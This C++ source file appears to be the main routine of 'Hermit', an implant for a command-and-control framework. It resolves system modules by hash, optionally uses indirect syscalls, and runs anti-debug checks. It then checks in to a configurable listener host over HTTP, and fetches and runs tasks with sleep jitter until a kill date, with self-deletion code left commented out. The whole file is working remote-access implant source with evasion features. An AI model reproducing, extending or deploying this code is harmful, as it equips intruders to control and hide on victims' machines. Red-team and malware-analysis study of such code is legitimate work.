#include "hermit.hpp"

namespace Hermit
{
	VOID Run(
		HINSTANCE       hInstance,
		INT 			nCmdShow,
		LPCWSTR			lpPayloadType,
		BOOL			bIndirectSyscalls,
		BOOL			bAntiDebug,
		LPCWSTR			lpProtocol,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpReqPathCheckIn,
		LPCWSTR			lpReqPathDownload,
		LPCWSTR 		lpReqPathTaskGet,
		LPCWSTR 		lpReqPathTaskResult,
		LPCWSTR			lpReqPathUpload,
		LPCWSTR			lpReqPathWebSocket,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate,
		LPCWSTR 		lpKey,
		LPCWSTR 		lpIV
	) {
		State::PSTATE pState = new State::STATE;

		pState->pTeb = NtCurrentTeb();

		Procs::PPROCS pProcs = new Procs::PROCS;

		// --------------------------------------------------------------------------
		// Get module handlers and functions.
		// --------------------------------------------------------------------------

		Modules::PMODULES pModules = new Modules::MODULES;

		HMODULE hNtdll = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_NTDLL);
        if (!hNtdll)
        {
			return;
        }
		pModules->hNtdll = hNtdll;

		HMODULE hKernel32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_KERNEL32);
		if (!hKernel32)
		{
			FreeLibrary(hNtdll);
			return;
		}
		pModules->hKernel32 = hKernel32;

		// Get functions
		Procs::FindProcs(
			pProcs,
			hNtdll,
			hKernel32,
			bIndirectSyscalls
		);

		// --------------------------------------------------------------------------
		// Get other module handlers functions.
		// --------------------------------------------------------------------------

		WCHAR wAdvapi32[] = L"advapi32.dll";
		HMODULE hAdvapi32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wAdvapi32);
		if (!hAdvapi32)
		{
			return;
		}
		pModules->hAdvapi32 = hAdvapi32;

		WCHAR wBcrypt[] = L"bcrypt.dll";
		HMODULE hBcrypt = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wBcrypt);
		if (!hBcrypt)
		{
			return;
		}
		pModules->hBcrypt = hBcrypt;

		WCHAR wCrypt32[] = L"crypt32.dll";
		HMODULE hCrypt32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wCrypt32);
		if (!hCrypt32)
		{
			return;
		}
		pModules->hCrypt32 = hCrypt32;

		WCHAR wDbghelp[] = L"dbghelp.dll";
		HMODULE hDbghelp = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wDbghelp);
		if (!hDbghelp)
		{
			return;
		}
		pModules->hDbghelp = hDbghelp;

		WCHAR wIphlpapi[] = L"iphlpapi.dll";
		HMODULE hIphlpapi = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wIphlpapi);
		if (!hIphlpapi)
		{
			return;
		}
		pModules->hIphlpapi = hIphlpapi;

		WCHAR wNetapi32[] = L"netapi32.dll";
		HMODULE hNetapi32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wNetapi32);
		if (!hNetapi32)
		{
			return;
		}
		pModules->hNetapi32 = hNetapi32;

		WCHAR wShell32[] = L"shell32.dll";
		HMODULE hShell32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wShell32);
		if (!hShell32)
		{
			return;
		}
		pModules->hShell32 = hShell32;

		WCHAR wUser32[] = L"user32.dll";
		HMODULE hUser32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wUser32);
		if (!hUser32)
		{
			return;
		}
		pModules->hUser32 = hUser32;

		WCHAR wWinHttp[] = L"winhttp.dll";
		HMODULE hWinHttp = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wWinHttp);
		if (!hWinHttp)
		{
			return;
		}
		pModules->hWinHttp = hWinHttp;

		WCHAR wWs2_32[] = L"ws2_32.dll";
		HMODULE hWs2_32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wWs2_32);
		if (!hWs2_32)
		{
			return;
		}
		pModules->hWs2_32 = hWs2_32;

		// Get functions
		Procs::FindProcsMisc(
			pProcs,
			hAdvapi32,
			hBcrypt,
			hCrypt32,
			hDbghelp,
			hIphlpapi,
			hNetapi32,
			hShell32,
			hUser32,
			hWinHttp,
			hWs2_32
		);

		// --------------------------------------------------------------------------
		// Store states others.
		// --------------------------------------------------------------------------

		pState->pModules 			= pModules;
		pState->pProcs				= pProcs;
		pState->pCrypt				= Crypt::InitCrypt(pState->pProcs, lpKey, lpIV);
		pState->hInstance 			= hInstance;
		pState->nCmdShow 			= nCmdShow;
		pState->lpPayloadType 		= lpPayloadType;
		pState->bIndirectSyscalls	= bIndirectSyscalls;
		pState->lpListenerProto 	= lpProtocol;
		pState->lpListenerHost 		= lpHost;
		pState->nListenerPort 		= nPort;
		pState->lpReqPathCheckIn 	= lpReqPathCheckIn;
		pState->lpReqPathTaskGet 	= lpReqPathTaskGet;
		pState->lpReqPathTaskResult = lpReqPathTaskResult;
		pState->lpReqPathDownload 	= lpReqPathDownload;
		pState->lpReqPathUpload 	= lpReqPathUpload;
		pState->lpReqPathWebSocket 	= lpReqPathWebSocket;
		pState->nSleep 				= nSleep;
		pState->nJitter 			= nJitter;
		pState->nKillDate 			= nKillDate;
		pState->hSession 			= NULL;
		pState->hConnect 			= NULL;
		pState->hRequest 			= NULL;
		// pState->pSocket 			= NULL;
		pState->bQuit 				= FALSE;

		// --------------------------------------------------------------------------
		// Anti-Debug
		// --------------------------------------------------------------------------

		// Anti-Debug
		if (bAntiDebug)
		{
			Technique::AntiDebug::StopIfDebug(pState->pProcs);
		}

		// --------------------------------------------------------------------------
		// Get initial info and http handlers.
		// --------------------------------------------------------------------------

		// Get system information
		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);

		// Initialize WinHttp handlers
		Handler::HTTPInit(pState);
		if (pState->hSession == NULL || pState->hConnect == NULL)
		{
			// System::Fs::SelfDelete(pState->pProcs);
			State::Free(pState);
			return;
		}

		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

		// --------------------------------------------------------------------------
		// Check-in
		// --------------------------------------------------------------------------

		do
		{
			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);

			if (Handler::IsKillDateReached(pState))
			{
				pState->bQuit = TRUE;
			}

			if (Handler::CheckIn(pState, wInfoJson))
			{
				break;
			}
		} while (1 == 1);

		// --------------------------------------------------------------------------
		// Process tasks
		// --------------------------------------------------------------------------

		do
		{
			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);

			if (Handler::IsKillDateReached(pState))
			{
				pState->bQuit = TRUE;
			}

			Handler::Task(pState);

			// Manage socket connections
			// Handler::Socket(pState);
		} while (!pState->bQuit);

		// System::Fs::SelfDelete(pState->pProcs);
		State::Free(pState);
		return;
	}
}

